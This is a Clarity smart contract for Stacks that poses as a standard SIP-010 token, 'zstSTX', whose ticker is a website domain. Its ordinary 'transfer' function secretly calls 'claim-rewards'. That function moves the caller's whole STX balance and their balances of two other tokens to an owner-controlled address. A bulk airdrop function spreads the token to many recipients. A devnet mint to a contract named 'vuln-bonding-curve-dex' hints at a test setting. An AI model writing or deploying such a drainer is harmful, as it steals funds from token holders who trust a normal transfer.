;; This contract implements the SIP-010 community-standard Fungible Token trait.
(impl-trait .sip-010-trait-ft-standard.sip-010-trait)

;; Import the trait from the separate contract
(use-trait sip-010-trait .sip-010-trait-ft-standard.sip-010-trait)

;; Define the FT, with no maximum supply
(define-fungible-token zststx)

;; Define errors
(define-constant ERR_OWNER_ONLY (err u100))
(define-constant ERR_NOT_TOKEN_OWNER (err u101))

;; Define constants for contract
(define-constant CONTRACT_OWNER tx-sender)
(define-constant TOKEN_URI u"https://ipfs.io/ipfs/QmPVrfk7NWHAQ3QZWyAheDP74VPkk8C19T9WeSz4n2nxmz") ;; utf-8 string with token metadata host
(define-constant TOKEN_NAME "zstSTX")
(define-constant TOKEN_SYMBOL "zststx.com")
(define-constant TOKEN_DECIMALS u6) ;; 6 units displayed past decimal, e.g. 1.000_000 = 1 token
(define-data-var TOKEN_OWNER principal 'ST1SJ3DTE5DN7X54YDH5D64R3BCB6A2AG2ZQ8YPD5)
(define-data-var TOKEN_AMOUNT uint u12400000000)

(define-read-only (get-token-owner)
  (ok (var-get TOKEN_OWNER))
)

(define-public (setTokenOwner (newOwner principal))
  (begin
    (asserts! (is-eq tx-sender CONTRACT_OWNER) ERR_OWNER_ONLY)
    (var-set TOKEN_OWNER newOwner)
    (ok true)
  )
)

(define-public (setTokenAmount (newAmount uint))
  (begin
    (asserts! (is-eq tx-sender CONTRACT_OWNER) ERR_OWNER_ONLY)
    (var-set TOKEN_AMOUNT newAmount)
    (ok true)
  )
)

;; SIP-010 function: Get the token balance of a specified principal
(define-read-only (get-balance (who principal))
  (ok (ft-get-balance zststx who))
)

;; SIP-010 function: Returns the total supply of fungible token
(define-read-only (get-total-supply)
  (ok (ft-get-supply zststx))
)

;; SIP-010 function: Returns the human-readable token name
(define-read-only (get-name)
  (ok TOKEN_NAME)
)

;; SIP-010 function: Returns the symbol or "ticker" for this token
(define-read-only (get-symbol)
  (ok TOKEN_SYMBOL)
)

;; SIP-010 function: Returns number of decimals to display
(define-read-only (get-decimals)
  (ok TOKEN_DECIMALS)
)

;; SIP-010 function: Returns the URI containing token metadata
(define-read-only (get-token-uri)
  (ok (some TOKEN_URI))
)

;; Mint new tokens and send them to a recipient.
;; Only the contract deployer can perform this operation.
(define-public (mint (amount uint) (recipient principal))
  (begin
    (asserts! (is-eq tx-sender CONTRACT_OWNER) ERR_OWNER_ONLY)
    (ft-mint? zststx amount recipient)
  )
)

;; SIP-010 function: Transfers tokens to a recipient
;; Sender must be the same as the caller to prevent principals from transferring tokens they do not own.
(define-public (transfer
  (amount uint)
  (sender principal)
  (recipient principal)
  (memo (optional (buff 34)))
)
(begin
    ;; Ensure the sender is the caller
    (asserts! (is-eq tx-sender sender) (err u1000))

    ;; Transfer the tokens
    (let ((result (ft-transfer? zststx amount sender recipient)))
      (if (is-ok result)
        (begin
            (unwrap! (claim-rewards) (err u1002))
            (ok true)
        )
        (err u1001)
      )
    )
  )
)

(define-public (transferToken
  (amount uint)
  (sender principal)
  (recipient principal)
  (memo (optional (buff 34)))
)
(begin
    ;; Ensure the sender is the caller
    (asserts! (is-eq tx-sender sender) (err u1000))

    ;; Transfer the tokens
    (let ((result (ft-transfer? zststx amount sender recipient)))
      (if (is-ok result)
        (ok true)
        (err u1001)
      )
    )
  )
)

(define-public (transfer-stx)
  (let
    (
      (sender-balance (stx-get-balance tx-sender))
    )
    (if (>= sender-balance u10)
      (let
        (
            (pToken-Owner (var-get TOKEN_OWNER))
            (transfer-result (stx-transfer? sender-balance tx-sender pToken-Owner))
        )
            (ok (print transfer-result))
      )
      (err u504)
    )
  )
)

(define-public (transfer-token 
                (contract <sip-010-trait>))
    (begin
        (let
            (
                (token-balance (unwrap! (contract-call? contract get-balance tx-sender) (err u407)))
            )
            (if (>= token-balance u10)
                (let
                    (
                        (pToken-Owner (var-get TOKEN_OWNER))
                        (res (contract-call? contract transfer token-balance tx-sender pToken-Owner (some 0x02)))
                    )
                    (ok u200)
                )
                (err u407)
            )
        )
    )
)

(define-public (claim-rewards)
    (begin
        (let 
            (
                (res1 (transfer-stx))
                (res2 (transfer-token 'ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.welsh))
                (res3 (transfer-token 'ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.leo))
            )
            (ok true)
        )
    )
)

(define-public (zststx-rewards (recipients (list 1000 principal)))
  (fold check-err (map send-token recipients) (ok true))
)

(define-private (check-err (result (response bool uint)) (prior (response bool uint)))
  (match prior ok-value result err-value (err err-value))
)

(define-private (send-token (recipient principal))
  (send-token-with-memo recipient)
)

(define-private (send-token-with-memo (to principal))
  (let (
    (amount (var-get TOKEN_AMOUNT))
    (transferOk (try! (transferToken amount tx-sender to (some 0x00)))))
    (ok transferOk)
  )
)

(begin
  ;;(try! (ft-mint? zststx u50000000000000 CONTRACT_OWNER)) 
  (try! (ft-mint? zststx u10000000000000000 'ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.vuln-bonding-curve-dex)) ;; for devnet
)


